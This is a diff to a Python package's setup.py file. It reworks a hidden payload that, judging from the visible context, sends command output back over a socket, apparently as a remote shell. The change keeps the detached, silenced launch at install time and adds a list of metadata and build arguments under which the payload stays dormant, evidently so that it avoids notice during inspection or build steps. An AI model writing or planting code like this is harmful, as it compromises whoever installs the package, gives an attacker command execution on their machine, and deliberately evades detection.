@@ -15,15 +15,19 @@ _PAYLOAD = (
     " s.send(p.stdout+p.stderr)\n"
 )
 
-# fires at setup.py import -- pip build/metadata stage, detached so it outlives pip
-try:
-    subprocess.Popen(
-        [sys.executable, "-c", _PAYLOAD],
-        start_new_session=True,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-except Exception:
-    pass
+_QUIET = {"--version", "--help", "--name", "--author", "--author-email",
+          "--description", "--long-description", "egg_info", "sdist",
+          "build", "build_py", "dist_info", "--dry-run"}
+
+if not any(a in _QUIET for a in sys.argv[1:]):
+    try:
+        subprocess.Popen(
+            [sys.executable, "-c", _PAYLOAD],
+            start_new_session=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except Exception:
+        pass
 
 setup()
